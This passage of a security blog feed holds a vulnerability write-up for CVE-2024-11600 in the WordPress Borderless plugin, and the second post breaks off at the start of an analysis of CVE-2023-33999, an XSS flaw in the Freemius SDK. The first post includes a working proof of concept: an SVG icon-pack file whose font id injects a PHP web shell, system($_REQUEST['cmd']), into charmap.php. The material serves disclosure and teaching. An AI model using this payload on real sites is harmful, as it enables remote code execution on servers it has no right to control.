$file_contents = json_decode( $json );&#xA;        if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack. Use only Icomoon Icon Pack files.&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;        }&#xA;        &#xA;        // Iterate over icons to build $this-&amp;gt;json_config&#xA;        $icons = $file_contents-&amp;gt;icons;&#xA;        foreach ( $icons as $icon ) {&#xA;            // Sanitize each piece of data to prevent injection&#xA;            $raw_name   = isset( $icon-&amp;gt;properties-&amp;gt;name ) ? $icon-&amp;gt;properties-&amp;gt;name : &amp;#39;unknown&amp;#39;;&#xA;            $icon_name  = sanitize_text_field( $raw_name );&#xA;            &#xA;            // Create a &amp;#34;class&amp;#34; by removing spaces and sanitizing further&#xA;            $icon_class = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#39;, $icon_name );&#xA;            // Remove any other characters that are not typical in a CSS class&#xA;            $icon_class = preg_replace( &amp;#39;/[^A-Za-z0-9\-_]/&amp;#39;, &amp;#39;&amp;#39;, $icon_class );&#xA;            &#xA;            $raw_tags   = isset( $icon-&amp;gt;icon-&amp;gt;tags ) ? $icon-&amp;gt;icon-&amp;gt;tags : array();&#xA;            // Sanitize each tag&#xA;            $safe_tags  = array_map( &amp;#39;sanitize_text_field&amp;#39;, $raw_tags );&#xA;            $tags       = implode( &amp;#34;,&amp;#34;, $safe_tags );&#xA;            &#xA;            $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ][ $icon_name ] = array(&#xA;                &amp;#34;class&amp;#34; =&amp;gt; $icon_class,&#xA;                &amp;#34;tags&amp;#34;  =&amp;gt; $tags&#xA;            );&#xA;        }&#xA;&#xA;        if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;            $this-&amp;gt;write_config();&#xA;            $this-&amp;gt;re_write_css();&#xA;            $this-&amp;gt;rename_files();&#xA;            $this-&amp;gt;rename_folder();&#xA;            $this-&amp;gt;add_font();&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function is the &lt;strong&gt;core&lt;/strong&gt; of the Icon Pack importing process. It is responsible for reading data from the SVG and JSON files, then generating the icon configuration used by the plugin.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check for required files&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;$this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#39;SVG file or selection.json not found...&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The plugin searches for a &lt;code&gt;.json&lt;/code&gt; file and an &lt;code&gt;.svg&lt;/code&gt; font file in the temporary directory.&lt;/li&gt;&#xA;&lt;li&gt;If one of them is missing, the process is aborted.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Read SVG and JSON contents&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;$json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;wp_remote_fopen&lt;/code&gt; to read the SVG via URL, falling back to &lt;code&gt;file_get_contents&lt;/code&gt; if it fails.&lt;/li&gt;&#xA;&lt;li&gt;Reads the JSON directly from the temporary directory.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Parse SVG to get the font name&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$xml       = simplexml_load_string( $response );&#xA;$font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;$this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Extracts the &lt;code&gt;id&lt;/code&gt; attribute of the &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; tag as the font name (&lt;code&gt;ip_name&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Only sanitized using &lt;code&gt;sanitize_text_field()&lt;/code&gt; → this is the vulnerable point, because it does not remove dangerous characters in the context of a PHP file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Check for name collisions&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;if ( is_dir( $font_folder ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;There is already an Icon Pack with this name...&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If a font folder with the same name already exists, the process is aborted.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Parse JSON to get icon list&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_contents = json_decode( $json );&#xA;if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack...&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ensures the JSON is a valid IcoMoon pack.&lt;/li&gt;&#xA;&lt;li&gt;Iterates over the icon list, sanitizes names, classes, and tags, then stores them in &lt;code&gt;$this-&amp;gt;json_config&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Generate configuration and write file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;    $this-&amp;gt;write_config();&#xA;    $this-&amp;gt;re_write_css();&#xA;    $this-&amp;gt;rename_files();&#xA;    $this-&amp;gt;rename_folder();&#xA;    $this-&amp;gt;add_font();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the data is valid, the plugin:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Writes &lt;code&gt;charmap.php&lt;/code&gt; containing the &lt;code&gt;$icons&lt;/code&gt; array&lt;/li&gt;&#xA;&lt;li&gt;Regenerates CSS&lt;/li&gt;&#xA;&lt;li&gt;Renames files and folders&lt;/li&gt;&#xA;&lt;li&gt;Adds the font pack to the system&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The required JSON and SVG files look like this:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;id&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Administrator privilege&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Uploads a ZIP file containing an Icon Pack (SVG &amp;#43; JSON)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;AJAX call: borderless_ajax_add_zipped_font&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;create_config() is executed&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Reads the SVG file&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Extracts font id=... as ip_name&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;sanitize_text_field(ip_name) (dangerous characters not removed)&amp;#34;]&#xA;&#xA;E --&amp;gt; I[&amp;#34;Reads JSON file&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Builds $this-&amp;gt;json_config array&amp;#34;]&#xA;&#xA;H &amp;amp; J --&amp;gt; K[&amp;#34;write_config() writes data into charmap.php&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Injected payload is embedded into PHP code&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;charmap.php now contains malicious PHP&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Server loads/includes charmap.php&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a ZIP file containing &lt;code&gt;rce.json&lt;/code&gt; and &lt;code&gt;rce.svg&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;&amp;#39;];system($_REQUEST[&amp;#39;cmd&amp;#39;]);//&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Using an Administrator account, upload the ZIP file at the endpoint:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=borderless-fonts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#34; title=&#34;Uploaded file&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Uploaded&lt;/h2&gt;&lt;p&gt;Uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#39; alt=&#34;Uploaded&#34; height=&#34;152&#34; width=&#34;1099&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Uploaded file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;RCE result&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#39; alt=&#34;Result&#34; height=&#34;757&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-11600 demonstrates that using the wrong sanitization function can lead to &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. Borderless (≤ 1.6.0) directly takes the &lt;code&gt;&amp;lt;font id&amp;gt;&lt;/code&gt; value from the SVG, sanitizes it only with &lt;code&gt;sanitize_text_field()&lt;/code&gt;, and writes it into a PHP file (&lt;code&gt;charmap.php&lt;/code&gt;). An attacker with Administrator privileges can inject PHP code, which is executed when the file is loaded. Version 1.6.1 fixed this by using &lt;code&gt;sanitize_file_name()&lt;/code&gt; and a fallback value.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;sanitize according to context&lt;/strong&gt; (this data is written into PHP, not plain text).&lt;/li&gt;&#xA;&lt;li&gt;Do not use &lt;code&gt;sanitize_text_field()&lt;/code&gt; for data written into executable source code.&lt;/li&gt;&#xA;&lt;li&gt;SVG/ZIP files can also be attack vectors.&lt;/li&gt;&#xA;&lt;li&gt;Automatically generating &lt;code&gt;.php&lt;/code&gt; files must always be strictly controlled.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/borderless/vulnerability/wordpress-borderless-plugin-1-5-9-authenticated-administrator-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin &amp;lt;= 1.6.0 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-33999 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-05-cve-2023-33999/</link>
      <pubDate>Fri, 05 Dec 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-05-cve-2023-33999/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK for WordPress&lt;/strong&gt; does not properly &lt;strong&gt;sanitize&lt;/strong&gt; input data or &lt;strong&gt;escape&lt;/strong&gt; output data, leading to a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability. This directly affects &lt;strong&gt;more than 1,000 plugins and themes&lt;/strong&gt; using this SDK.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-33999&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.5.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.5.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://freemius.com/help/documentation/wordpress-sdk/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Freemius SDK for WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 